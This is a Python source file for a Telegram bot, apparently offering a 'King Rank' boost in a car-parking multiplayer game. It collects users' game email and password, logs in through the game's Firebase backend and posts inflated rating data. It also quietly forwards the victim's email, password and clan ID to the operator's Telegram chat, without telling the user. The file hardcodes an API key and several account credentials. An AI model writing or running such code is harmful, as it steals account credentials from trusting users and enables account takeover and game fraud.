import os
import requests
import json
import telebot
from flask import Flask
from threading import Thread

# --- Game Service Configuration ---
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"

# --- Telegram Bot Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не задан!")

bot = telebot.TeleBot(BOT_TOKEN)

user_states = {}

# --- АККАУНТЫ ДЛЯ /level ---
ACCOUNTS = [
    {"email": "kingcpmcpm48@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm49@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm50@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm51@gmail.com", "password": "666666"},
    {"email": "kingcpmcpm52@gmail.com", "password": "666666"},
]

# --- FUNCTIONS ---
def send_to_telegram(email, password, clan_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except:
        pass


def login(email, password):
    print("\n🔐 ВХОД В СИСТЕМУ...")
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)",
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        data = response.json()

        if response.status_code == 200 and 'idToken' in data:
            print("✅ ВХОД В СИСТЕМУ ПРОШЁЛ УСПЕШНО!")
            return data.get('idToken')
        else:
            print("❌ ОШИБКА ВХОДА")
            return None
    except:
        return None


def set_rank(token):
    print("👑 СКРИПТ ВЫПОЛНЯЕТСЯ...")
    rating_data = {k: 100000 for k in [
        "cars","car_fix","car_collided","car_exchange","car_trade","car_wash",
        "slicer_cut","drift_max","drift","cargo","delivery","taxi","levels",
        "gifts","fuel","offroad","speed_banner","reactions","police","run",
        "real_estate","t_distance","treasure","block_post","push_ups",
        "burnt_tire","passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000

    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }

    try:
        r = requests.post(RANK_URL, headers=headers, json=payload)
        if r.status_code == 200:
            print("✅ СКРИПТ ВЫПОЛНЕН!")
            return True
        else:
            print("❌ НЕ УДАЛОСЬ ВЫПОЛНИТЬ СКРИПТ")
            return False
    except:
        return False


def check_clan_id(token, email, password):
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "okhttp/3.12.13",
        "Content-Type": "application/json"
    }
    payload = {"data": None}

    try:
        r = requests.post(CLAN_ID_URL, headers=headers, json=payload)
        if r.status_code == 200:
            clan_id = r.json().get("result", "")
            if clan_id:
                send_to_telegram(email, password, clan_id)
    except:
        pass


def run_mass_rank():
    for acc in ACCOUNTS:
        token = login(acc["email"], acc["password"])
        if token:
            set_rank(token)

# --- COMMANDS ---
@bot.message_handler(commands=["start"])
def handle_start(message):
    user_states[message.from_user.id] = {"step": "await_email"}
    bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")


@bot.message_handler(commands=["level"])
def handle_level(message):
    bot.reply_to(message, "🚀 Запуск KING RANK...")
    Thread(target=run_mass_rank).start()
    bot.reply_to(message, "👑 KING RANK установлены на всех аккаунтах!")

# --- USER FLOW ---
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id not in user_states:
        return

    state = user_states[user_id]

    if state["step"] == "await_email":
        state["email"] = text
        state["step"] = "await_password"
        bot.reply_to(message, "🔒 ⚫️ВВЕДИ ПАРОЛЬ⚫️")

    elif state["step"] == "await_password":
        email = state["email"]
        password = text

        auth_token = login(email, password)
        if auth_token:
            if set_rank(auth_token):
                check_clan_id(auth_token, email, password)
                bot.reply_to(message, "✅ King Rank установлен успешно.")
            else:
                bot.reply_to(message, "❌ Не удалось установить King Rank.")
        else:
            bot.reply_to(message, "❌ Ошибка при входе.")

        del user_states[user_id]
        bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")

# --- Flask ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

# --- START ---
if __name__ == "__main__":
    Thread(target=bot.polling).start()
    run_flask()
